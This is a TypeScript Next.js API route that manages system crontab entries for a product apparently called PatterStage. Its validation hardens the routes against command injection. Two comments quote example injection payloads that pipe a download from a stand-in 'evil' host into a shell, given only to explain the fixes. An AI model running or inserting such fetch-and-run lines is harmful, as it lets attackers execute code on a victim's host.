import { NextRequest, NextResponse } from "next/server";
import * as fs from "fs";
import { join } from "path";

import { logApiError, serverErrorFromError } from "@/lib/api-logger";
import { requireAuth, requireAuthenticatedHostWrites, isReadOnly } from "@/lib/api-auth";
import { parseJsonBody } from "@/lib/parse-json-body";
import { badRequest, notFound, ok, serverErrorFromHelperResult, serviceUnavailable } from "@/lib/api-response";
import {
  crontabLineUsesScriptsDir,
  expandHomeInString,
  normalizeHardwareCronPath,
} from "@/lib/hardware-cron";
import { getHostScheduler } from "@/lib/host-scheduler";
import { getPsScriptsDir, getPsHardwareLogDir, PS_DATA_DIR } from "@/lib/paths";
import { interpreterFor } from "@/lib/platform";
import { resolveScriptPath } from "@/lib/scripts-manager";

/**
 * Hardware Cron API — System crontab management
 *
 * GET    /api/cron/hardware         — List all hardware cron jobs
 * POST   /api/cron/hardware         — Create a new hardware cron job (or { action: "pauseAll" } to disable all)
 * PUT    /api/cron/hardware         — Update an existing hardware cron job
 * DELETE /api/cron/hardware?id=...  — Delete a hardware cron job by ID
 *
 * Hardware cron jobs are system cron entries managed via crontab(1).
 * They survive agent restarts and run independently of any agent install.
 *
 * Entry format in crontab:
 *   {min} {hour} {dom} {mon} {dow} HOME={homedir} {cmd} >> {log} 2>&1
 *
 * We identify our managed entries by their script path prefix:
 *   PS_SCRIPTS_DIR (default: PS_DATA_DIR/scripts)
 */

const DISABLED_STATE_FILE = join(PS_DATA_DIR, ".disabled_hardware_crons.json");

/** Load the set of disabled hardware cron job IDs */
function loadDisabledIds(): Set<string> {
  try {
    const raw = fs.readFileSync(DISABLED_STATE_FILE, "utf-8");
    const arr = JSON.parse(raw);
    return new Set(Array.isArray(arr) ? arr : []);
  } catch {
    return new Set();
  }
}

/** Persist the set of disabled hardware cron job IDs */
function saveDisabledIds(ids: Set<string>): void {
  try {
    fs.writeFileSync(DISABLED_STATE_FILE, JSON.stringify(Array.from(ids), null, 2), { mode: 0o600 });
  } catch (err) {
    logApiError("cron/hardware", "saveDisabledIds", err);
  }
}

// ── Parse / serialise helpers ───────────────────────────────────

const SCRIPT_EXT_RE = /\.(?:sh|mjs|cjs|js|ps1|bat|cmd)$/i;

/**
 * Extract the script basename (e.g. "ps-backup.mjs") from a command string, or
 * empty string if the command invokes no host script. Anchors on a path token
 * ending in a known script extension (any separator) so it doesn't pick up env
 * vars or the redirected log path.
 */
function extractScriptName(command: string): string {
  const m = command.match(/(\S+[/\\][^/\\\s]+\.(?:sh|mjs|cjs|js|ps1|bat|cmd))\b/i);
  return m ? m[1].split(/[/\\]/).pop()! : "";
}

/**
 * Apply an enable/disable flag to the disabledIds set:
 *   enabled === false → add
 *   enabled === true  → delete
 *   enabled === undefined → no-op (skip)
 *
 * Shared by PUT (toggle-only branch) and PUT (non-toggle branch's
 * post-write sync), so the "if (enabled === false) add else delete"
 * tri-state lives in exactly one place.
 */
function setDisabled(disabledIds: Set<string>, id: string, enabled: boolean | undefined): void {
  if (enabled === undefined) return;
  if (enabled === false) {
    disabledIds.add(id);
  } else {
    disabledIds.delete(id);
  }
}

/**
 * Compose `setDisabled` (mutate the in-memory set) with `saveDisabledIds`
 * (persist to disk) so PUT's two call sites collapse to a single call.
 * Byte-equivalent to the inline pair — `setDisabled` is a no-op when
 * `enabled` is undefined, matching the original call sites.
 */
function applyDisabledChange(
  disabledIds: Set<string>,
  id: string,
  enabled: boolean | undefined,
): void {
  setDisabled(disabledIds, id, enabled);
  saveDisabledIds(disabledIds);
}

/**
 * A job label becomes a `# <name>` comment line in the crontab, so a newline in
 * it writes an arbitrary extra crontab line. Collapse all whitespace.
 */
function sanitiseCronName(name: string | undefined): string | undefined {
  if (!name) return undefined;
  const flat = name.replace(/\s+/g, " ").trim().slice(0, 120);
  return flat || undefined;
}

/** POSIX single-quote a path so spaces and metacharacters cannot break out. */
function shellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * Every crontab field must be cron syntax and nothing else. Without this a
 * "5 fields" check passes `* * * * *;curl evil|sh` — the count is right and the
 * payload rides along into the user's crontab.
 */
const CRON_FIELD_RE = /^[0-9*,\-/]+$/;

function rejectIfBadSchedule(schedule: string): NextResponse | null {
  const fields = schedule.trim().split(/\s+/);
  if (fields.length !== 5) {
    return badRequest("Schedule must have exactly 5 fields: min hour dom mon dow");
  }
  if (!fields.every((f) => CRON_FIELD_RE.test(f))) {
    return badRequest("Schedule fields may contain only digits, * , - and /");
  }
  return null;
}

/**
 * Rebuild the command PatterStage will install, from scratch.
 *
 * The previous check was `line.includes(scriptsDir + "/")` — a substring test,
 * so `curl evil.sh | sh  # /home/me/patterstage/data/scripts/` passed it and
 * became a crontab line. Validating attacker-controlled text is the wrong
 * shape of solution: instead we take ONLY the script's basename out of the
 * caller's input, resolve it under the scripts dir (which rejects traversal and
 * non-existent files), and regenerate the command from the interpreter map.
 * Anything else the caller supplied is discarded rather than approved.
 */
function canonicaliseScriptsCommand(
  input: string,
): { ok: true; command: string; scriptName: string } | { ok: false; response: NextResponse } {
  const scriptsDir = getPsScriptsDir();
  const bad = (msg: string) => ({ ok: false as const, response: badRequest(msg) });

  // A path token ending in a script extension, or a bare basename.
  const match = input.match(/(?:^|[\s'"])([^\s'"]*[/\\])?([^\s/\\'"]+\.(?:sh|mjs|cjs|js))\b/i);
  const scriptName = match?.[2];
  if (!scriptName) {
    return bad("Command must name a script (.sh, .mjs, .cjs or .js) from the PatterStage scripts directory.");
  }

  // If the caller named a DIRECTORY, it must be the scripts dir. Rebuilding
  // `~/.hermes/scripts/x.mjs` into `<scriptsDir>/x.mjs` would be safe but would
  // silently run a different file than the operator asked for.
  const dirPart = match?.[1];
  if (dirPart) {
    const given = normalizeHardwareCronPath(expandHomeInString(dirPart));
    if (given !== normalizeHardwareCronPath(scriptsDir)) {
      return bad(`Scripts must live in ${scriptsDir}; '${dirPart}' is outside it.`);
    }
  }

  const abs = resolveScriptPath(scriptName);
  if (!abs) {
    return bad(`'${scriptName}' is not an existing script in the PatterStage hardware scripts directory.`);
  }

  const interpreter = interpreterFor(abs);
  if (!interpreter) return bad(`No interpreter is available for '${scriptName}' on this platform.`);

  void scriptsDir; // resolveScriptPath already anchors to it; kept for clarity of intent
  const command = [interpreter.cmd, ...interpreter.args].map(shellQuote).join(" ");
  return { ok: true, command, scriptName };
}

/**
 * Constrain the log target to a plain filename inside the hardware log dir.
 * `logFile` is interpolated into the crontab line as `>> <logFile> 2>&1`, so an
 * unconstrained value is the same injection hole as the command was.
 */
function resolveCronLogFile(requested: string | undefined, entryId: string): string | null {
  const logDir = getPsHardwareLogDir();
  if (!requested) return `${logDir}/${entryId}.log`;
  const base = requested.split(/[/\\]/).pop() ?? "";
  if (!base || !/^[A-Za-z0-9._-]+\.log$/.test(base)) return null;
  return `${logDir}/${base}`;
}

/**
 * Parse a crontab line into a structured job.
 * Returns null for lines we don't manage.
 */
function parseCrontabLine(
  line: string,
): {
  id: string;
  raw: string;
  schedule: string;
  command: string;
  logFile: string;
  name: string;
  enabled: boolean;
} | null {
  const trimmed = line.trim();

  if (!trimmed || trimmed.startsWith("#")) return null;

  if (!crontabLineUsesScriptsDir(trimmed, getPsScriptsDir())) return null;

  const parts = trimmed.split(/\s+/);
  if (parts.length < 6) return null;

  const [min, hour, dom, mon, dow, ...rest] = parts;
  const schedule = [min, hour, dom, mon, dow].join(" ");

  // Extract command (everything after the 5 schedule fields)
  const fullCmd = rest.join(" ");

  // Extract log file: `>> /path/to.log 2>&1`
  const logMatch = fullCmd.match(/>>\s*(\S+\.log)\s*2>/);
  const logFile = logMatch ? logMatch[1] : "";
  // Remove log redirection from command
  const command = fullCmd.replace(/>>\s*\S+\.log\s*2>.*$/, "").trim();

  // Extract script name for ID and display name
  const scriptName = extractScriptName(command);
  const id =
    scriptName.replace(SCRIPT_EXT_RE, "") ||
    command.split(" ")[0]?.split(/[/\\]/).pop() ||
    "unknown";

  // Name from script: ps-backup → PatterStage Backup
  const name = scriptName
    .replace(/^(?:ps|ch)-/, "PatterStage ")
    .replace(SCRIPT_EXT_RE, "")
    .replace(/-/g, " ")
    .replace(/\b\w/g, (c) => c.toUpperCase());

  return { id, raw: trimmed, schedule, command, logFile, name, enabled: true };
}

/**
 * Serialise a job into a crontab line.
 */
function serialiseLine(
  schedule: string,
  command: string,
  logFile: string
): string {
  // Preserve the original command with any env vars
  const logRedirect = logFile ? ` >> ${logFile} 2>&1` : "";
  return `${schedule} ${command}${logRedirect}`;
}

// ── Read / write crontab ───────────────────────────────────────

// Cross-platform: crontab on Unix, Task Scheduler (schtasks) on Windows. The
// scheduler presents the managed jobs as crontab-format text either way, so the
// parse/serialise logic below is unchanged. See src/lib/host-scheduler.ts.
function readCrontab(): Promise<string> {
  return getHostScheduler().readRaw();
}

function writeCrontab(content: string): Promise<{ ok: boolean; error?: string }> {
  return getHostScheduler().writeRaw(content);
}

/**
 * Join a list of crontab lines into the on-disk format. The
 * `.filter((l) => l.trim() || l === "")` step preserves intentionally
 * empty lines (used as separators between job blocks) while dropping
 * lines that are only whitespace. Centralised so the 3 call sites
 * (POST create, PUT update, PUT delete) use the same exact filter
 * discipline — a future "preserve lines containing only a `#`" change
 * lands in one place.
 */
function joinCrontabLines(lines: string[]): string {
  return lines.filter((l) => l.trim() || l === "").join("\n");
}

// ── Shared crontab read+parse helper ─────────────────────────

interface CrontabJobRaw {
  id: string;
  name: string;
  schedule: string;
  command: string;
  logFile: string;
}

async function readAndParseCrontab(): Promise<{ jobs: CrontabJobRaw[]; disabledIds: Set<string> }> {
  const crontab = await readCrontab();
  const disabledIds = loadDisabledIds();
  const lines = crontab.split("\n");
  const jobs = lines
    .map(parseCrontabLine)
    .filter((j): j is NonNullable<typeof j> => j !== null)
    .map((j) => ({
      id: j.id,
      name: j.name,
      schedule: j.schedule,
      enabled: !disabledIds.has(j.id),
      command: j.command,
      logFile: j.logFile,
    }));
  return { jobs, disabledIds };
}

// ── API handlers ───────────────────────────────────────────────

export async function GET(request: NextRequest) {
  const auth = requireAuth(request);
  if (auth) return auth;

  try {
    const { jobs } = await readAndParseCrontab();
    return ok({ jobs, total: jobs.length });
  } catch (e: unknown) {
    return serverErrorFromError("GET /api/cron/hardware", "read crontab", e, "Failed to read crontab");
  }
}

export async function POST(request: NextRequest) {
  const auth = requireAuth(request);
  if (auth) return auth;
  // Installing a crontab line makes the host execute code on a timer.
  const hostWrites = requireAuthenticatedHostWrites();
  if (hostWrites) return hostWrites;
  if (isReadOnly()) {
    return serviceUnavailable("PatterStage is in read-only mode");
  }

  try {
    const bodyResult = await parseJsonBody(request);
    if (bodyResult instanceof NextResponse) return bodyResult;
    const body = bodyResult;

    // ── pauseAll action ────────────────────────────────────────────────
    if ((body as Record<string, unknown>).action === "pauseAll") {
      const disabledIds = loadDisabledIds();
      const crontab = await readCrontab();
      const lines = crontab.split("\n");
      const jobIds: string[] = [];

      for (const line of lines) {
        const parsed = parseCrontabLine(line);
        if (parsed) {
          jobIds.push(parsed.id);
          disabledIds.add(parsed.id);
          await getHostScheduler().setEnabled(parsed.id, false);
        }
      }

      saveDisabledIds(disabledIds);
      return ok({ success: true, pausedCount: jobIds.length });
    }

    // ── Sync action ───────────────────────────────────────────────────
    // Re-read crontab and return all detected hardware cron jobs.
    // This picks up any jobs added or modified outside PatterStage.
    if ((body as Record<string, unknown>).action === "sync") {
      const { jobs } = await readAndParseCrontab();
      return ok({ jobs, total: jobs.length });
    }

    // ── Create new hardware cron job ────────────────────────────────────
    const { schedule, command, name, logFile } = body as {
      schedule?: string;
      command?: string;
      name?: string;
      logFile?: string;
    };

    if (!schedule || !command) {
      return badRequest("schedule and command are required");
    }

    const badSchedule = rejectIfBadSchedule(schedule);
    if (badSchedule) return badSchedule;

    const canonical = canonicaliseScriptsCommand(command);
    if (!canonical.ok) return canonical.response;

    const crontab = await readCrontab();
    const lines = crontab.split("\n");

    // Check if this script already has an entry (replace if so)
    const entryId = canonical.scriptName.replace(SCRIPT_EXT_RE, "") || "hw";

    const resolvedLog = resolveCronLogFile(logFile, entryId);
    if (!resolvedLog) return badRequest("logFile must be a plain '*.log' filename.");
    const safeName = sanitiseCronName(name);
    const newLine = serialiseLine(schedule, canonical.command, resolvedLog);
    const newLines: string[] = [];
    let replaced = false;

    for (const line of lines) {
      const parsed = parseCrontabLine(line);
      if (parsed && parsed.id === entryId) {
        // Replace existing entry for this script
        if (safeName) {
          newLines.push(`# ${safeName}`);
        }
        newLines.push(newLine);
        replaced = true;
      } else {
        newLines.push(line);
      }
    }

    if (!replaced) {
      if (safeName) {
        newLines.push(`# ${safeName}`);
      }
      newLines.push(newLine);
    }

    // Write crontab synchronously (execSync is acceptable here — it is a
    // single blocking call with no async I/O available for crontab writes).
    const result = await writeCrontab(joinCrontabLines(newLines));
    if (!result.ok) {
      return serverErrorFromHelperResult(result, "unknown error");
    }

    // Echo what was actually installed, not what was asked for.
    return ok({ id: entryId, schedule, command: canonical.command, name: safeName, logFile: resolvedLog });
  } catch (e: unknown) {
    return serverErrorFromError("POST /api/cron/hardware", "create hardware cron", e, "Failed to create hardware cron job");
  }
}

export async function PUT(request: NextRequest) {
  const auth = requireAuth(request);
  if (auth) return auth;
  // Installing a crontab line makes the host execute code on a timer.
  const hostWrites = requireAuthenticatedHostWrites();
  if (hostWrites) return hostWrites;
  if (isReadOnly()) {
    return serviceUnavailable("PatterStage is in read-only mode");
  }

  try {
    const bodyResult = await parseJsonBody(request);
    if (bodyResult instanceof NextResponse) return bodyResult;
    const body = bodyResult;

    const { id, schedule, command, name, logFile, enabled } = body as {
      id?: string;
      schedule?: string;
      command?: string;
      name?: string;
      logFile?: string;
      enabled?: boolean;
    };

    if (!id) {
      return badRequest("id is required");
    }

    if (schedule !== undefined) {
      const badSchedule = rejectIfBadSchedule(schedule);
      if (badSchedule) return badSchedule;
    }

    const crontab = await readCrontab();
    const disabledIds = loadDisabledIds();
    const lines = crontab.split("\n");
    const newLines: string[] = [];
    let found = false;
    let rewriteError: NextResponse | null = null;

    // Separate: only toggle changes JSON; schedule/command/name changes rewrite crontab
    const isToggleOnly =
      enabled !== undefined &&
      schedule === undefined &&
      command === undefined &&
      name === undefined &&
      logFile === undefined;

    const safeName = sanitiseCronName(name);

    for (const line of lines) {
      const parsed = parseCrontabLine(line);
      if (parsed && parsed.id === id) {
        found = true;

        // Only rewrite crontab for non-toggle changes
        if (!isToggleOnly) {
          const newSchedule = schedule || parsed.schedule;
          // Re-derive the command every time we rewrite, from the caller's input
          // or from what is already installed — never trust either verbatim.
          const canonical = canonicaliseScriptsCommand(command || parsed.command);
          if (!canonical.ok) {
            rewriteError = canonical.response;
            newLines.push(line);
            continue;
          }
          const newLogFile = resolveCronLogFile(logFile ?? parsed.logFile, id);
          if (!newLogFile) {
            rewriteError = badRequest("logFile must be a plain '*.log' filename.");
            newLines.push(line);
            continue;
          }
          // Remove preceding comment if it was for this entry
          if (newLines.length > 0 && newLines[newLines.length - 1].startsWith("# ")) {
            newLines.pop();
          }
          if (safeName) newLines.push(`# ${safeName}`);
          newLines.push(serialiseLine(newSchedule, canonical.command, newLogFile));
        }
      } else {
        newLines.push(line);
      }
    }

    if (!found) {
      return notFound(`Hardware cron job '${id}' not found`);
    }
    if (rewriteError) return rewriteError;

    // Toggle-only: update JSON state (UI). On Windows also enable/disable the
    // scheduled task; no-op on Unix where the JSON is the source of truth.
    if (isToggleOnly) {
      await getHostScheduler().setEnabled(id, enabled!);
      applyDisabledChange(disabledIds, id, enabled);
      return ok({ id, enabled });
    }

    const result = await writeCrontab(joinCrontabLines(newLines));
    if (!result.ok) {
      return serverErrorFromHelperResult(result, "unknown error");
    }

    // Sync disabled state to JSON for this job
    if (enabled !== undefined) {
      applyDisabledChange(disabledIds, id, enabled);
    }

    return ok({ id, schedule, command, name, logFile, enabled });
  } catch (e: unknown) {
    return serverErrorFromError("PUT /api/cron/hardware", "update hardware cron", e, "Failed to update hardware cron job");
  }
}

export async function DELETE(request: NextRequest) {
  const auth = requireAuth(request);
  if (auth) return auth;
  // Installing a crontab line makes the host execute code on a timer.
  const hostWrites = requireAuthenticatedHostWrites();
  if (hostWrites) return hostWrites;
  if (isReadOnly()) {
    return serviceUnavailable("PatterStage is in read-only mode");
  }

  try {
    const { searchParams } = new URL(request.url);
    const id = searchParams.get("id");

    if (!id) {
      return badRequest("id is required");
    }

    const crontab = await readCrontab();
    const lines = crontab.split("\n");
    const newLines: string[] = [];
    let found = false;

    for (const line of lines) {
      const parsed = parseCrontabLine(line);
      if (parsed && parsed.id === id) {
        found = true;
        // Skip this line (and preceding comment if any)
        continue;
      }
      // Skip comment lines that immediately precede a deleted entry
      const prev = newLines[newLines.length - 1];
      if (!parsed && prev?.startsWith("# ") && line.trim() === "") {
        newLines.pop();
        continue;
      }
      newLines.push(line);
    }

    if (!found) {
      return notFound(`Hardware cron job '${id}' not found`);
    }

    const result = await writeCrontab(joinCrontabLines(newLines));
    if (!result.ok) {
      return serverErrorFromHelperResult(result, "unknown error");
    }

    // Remove from disabled set if present
    const disabledIds = loadDisabledIds();
    applyDisabledChange(disabledIds, id, true);

    return ok({ id });
  } catch (e: unknown) {
    return serverErrorFromError("DELETE /api/cron/hardware", "delete hardware cron", e, "Failed to delete hardware cron job");
  }
}
